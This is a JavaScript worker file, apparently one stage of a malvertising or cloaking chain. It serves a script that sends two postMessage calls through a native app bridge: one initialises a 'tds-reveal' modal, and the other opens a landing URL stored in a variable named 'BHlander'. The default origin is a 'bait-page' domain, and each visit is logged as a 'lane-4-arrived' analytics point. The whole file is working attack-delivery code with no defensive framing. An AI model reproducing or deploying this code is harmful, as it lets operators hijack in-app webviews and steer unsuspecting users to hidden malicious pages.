// §7 — the two-message native-bridge handshake. Takes whatever §6's
// classify() returned and sends it to the native side via bridge.postMessage,
// twice: an init/context message, then the actual "open this" command.
// Everything past the postMessage call happens in Swift, outside anything
// web-side code can see or control.

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript() {
  return `
function openContainer(state) {
  if (!state) return;
  const { bridge, context, webview, presentation } = state;

  bridge.postMessage({
    action: 'init',
    container: { className: 'tds-reveal', type: 'modal' },
    context,
    webview,
  });

  bridge.postMessage({
    action: 'open',
    sessionId: (typeof session !== 'undefined' && session) ? session.id : null,
    url: BHlander,
    presentation,
  });
}
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const body = await request.json().catch(() => ({}));
    env.ANALYTICS?.writeDataPoint({
      indexes: [body._sessionRef || ''],
      blobs: ['lane-4-arrived'],
      doubles: [Date.now()],
    });

    const code = buildDeliveredScript();
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
